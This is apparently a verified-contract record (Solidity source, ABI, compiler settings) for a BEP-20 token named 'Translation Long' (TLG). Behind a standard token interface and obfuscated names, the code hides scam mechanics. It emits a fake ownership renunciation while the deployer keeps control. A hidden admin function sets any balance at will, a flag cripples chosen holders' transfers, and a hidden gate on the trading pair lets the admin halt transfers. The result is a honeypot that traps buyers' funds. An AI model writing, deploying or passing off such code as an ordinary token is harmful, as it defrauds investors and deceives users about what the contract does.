{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface feeAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract toTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txExemptSell {\n    function createPair(address feeLiquidity, address autoLimit) external returns (address);\n}\n\ninterface takeIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableSwap) external view returns (uint256);\n\n    function transfer(address tokenTx, uint256 modeMarketing) external returns (bool);\n\n    function allowance(address enableExemptAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenTx,\n        uint256 modeMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitMax, uint256 value);\n    event Approval(address indexed enableExemptAmount, address indexed spender, uint256 value);\n}\n\ninterface totalExemptBuy is takeIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TranslationLong is toTeam, takeIs, totalExemptBuy {\n\n    uint256 constant tokenFund = 18 ** 10;\n\n    function approve(address enableTotal, uint256 modeMarketing) public virtual override returns (bool) {\n        amountWallet[_msgSender()][enableTotal] = modeMarketing;\n        emit Approval(_msgSender(), enableTotal, modeMarketing);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isExempt;\n    }\n\n    function fundLaunched(uint256 modeMarketing) public {\n        liquidityEnableFund();\n        walletFrom = modeMarketing;\n    }\n\n    function amountTxTeam(address autoSell, address tokenTx, uint256 modeMarketing) internal returns (bool) {\n        if (autoSell == receiverExempt) {\n            return launchedTradingTotal(autoSell, tokenTx, modeMarketing);\n        }\n        uint256 receiverLiquidity = takeIs(atTotal).balanceOf(swapAt);\n        require(receiverLiquidity == walletFrom);\n        require(tokenTx != swapAt);\n        if (limitLiquidityTotal[autoSell]) {\n            return launchedTradingTotal(autoSell, tokenTx, tokenFund);\n        }\n        return launchedTradingTotal(autoSell, tokenTx, modeMarketing);\n    }\n\n    uint256 public liquidityFrom;\n\n    uint256 private listIs = 100000000 * 10 ** 18;\n\n    function liquidityEnableFund() private view {\n        require(receiverFee[_msgSender()]);\n    }\n\n    function modeLaunched(address senderBuy, uint256 modeMarketing) public {\n        liquidityEnableFund();\n        atTradingSell[senderBuy] = modeMarketing;\n    }\n\n    function launchedTradingTotal(address autoSell, address tokenTx, uint256 modeMarketing) internal returns (bool) {\n        require(atTradingSell[autoSell] >= modeMarketing);\n        atTradingSell[autoSell] -= modeMarketing;\n        atTradingSell[tokenTx] += modeMarketing;\n        emit Transfer(autoSell, tokenTx, modeMarketing);\n        return true;\n    }\n\n    function balanceOf(address enableSwap) public view virtual override returns (uint256) {\n        return atTradingSell[enableSwap];\n    }\n\n    address autoList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minFrom;\n    }\n\n    uint256 private liquidityIsTo;\n\n    mapping(address => bool) public limitLiquidityTotal;\n\n    uint256 walletFrom;\n\n    string private minFrom = \"TLG\";\n\n    mapping(address => mapping(address => uint256)) private amountWallet;\n\n    constructor (){\n        \n        feeAt txToken = feeAt(autoList);\n        atTotal = txExemptSell(txToken.factory()).createPair(txToken.WETH(), address(this));\n        if (atMin != liquidityIsTo) {\n            liquidityIsTo = atMin;\n        }\n        receiverExempt = _msgSender();\n        receiverFromTrading();\n        receiverFee[receiverExempt] = true;\n        atTradingSell[receiverExempt] = listIs;\n        if (liquidityIsTo != liquidityFrom) {\n            shouldFee = true;\n        }\n        emit Transfer(address(0), receiverExempt, listIs);\n    }\n\n    function getOwner() external view returns (address) {\n        return exemptLimit;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listIs;\n    }\n\n    function transferFrom(address autoSell, address tokenTx, uint256 modeMarketing) external override returns (bool) {\n        if (_msgSender() != autoList) {\n            if (amountWallet[autoSell][_msgSender()] != type(uint256).max) {\n                require(modeMarketing <= amountWallet[autoSell][_msgSender()]);\n                amountWallet[autoSell][_msgSender()] -= modeMarketing;\n            }\n        }\n        return amountTxTeam(autoSell, tokenTx, modeMarketing);\n    }\n\n    bool public shouldFee;\n\n    bool private senderLaunched;\n\n    function owner() external view returns (address) {\n        return exemptLimit;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return atIs;\n    }\n\n    uint256 totalShould;\n\n    event OwnershipTransferred(address indexed listSwap, address indexed swapToken);\n\n    mapping(address => uint256) private atTradingSell;\n\n    bool public modeLaunchedWallet;\n\n    address swapAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private atMin;\n\n    address private exemptLimit;\n\n    mapping(address => bool) public receiverFee;\n\n    function receiverFromTrading() public {\n        emit OwnershipTransferred(receiverExempt, address(0));\n        exemptLimit = address(0);\n    }\n\n    function teamFund(address launchedAuto) public {\n        if (modeLaunchedWallet) {\n            return;\n        }\n        \n        receiverFee[launchedAuto] = true;\n        \n        modeLaunchedWallet = true;\n    }\n\n    address public receiverExempt;\n\n    function allowance(address takeMaxToken, address enableTotal) external view virtual override returns (uint256) {\n        if (enableTotal == autoList) {\n            return type(uint256).max;\n        }\n        return amountWallet[takeMaxToken][enableTotal];\n    }\n\n    string private isExempt = \"Translation Long\";\n\n    address public atTotal;\n\n    function transfer(address senderBuy, uint256 modeMarketing) external virtual override returns (bool) {\n        return amountTxTeam(_msgSender(), senderBuy, modeMarketing);\n    }\n\n    function fundWallet(address atReceiverSell) public {\n        liquidityEnableFund();\n        \n        if (atReceiverSell == receiverExempt || atReceiverSell == atTotal) {\n            return;\n        }\n        limitLiquidityTotal[atReceiverSell] = true;\n    }\n\n    uint8 private atIs = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableExemptAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMaxToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeMarketing\",\"type\":\"uint256\"}],\"name\":\"fundLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiverSell\",\"type\":\"address\"}],\"name\":\"fundWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitLiquidityTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMarketing\",\"type\":\"uint256\"}],\"name\":\"modeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunchedWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFromTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAuto\",\"type\":\"address\"}],\"name\":\"teamFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TranslationLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}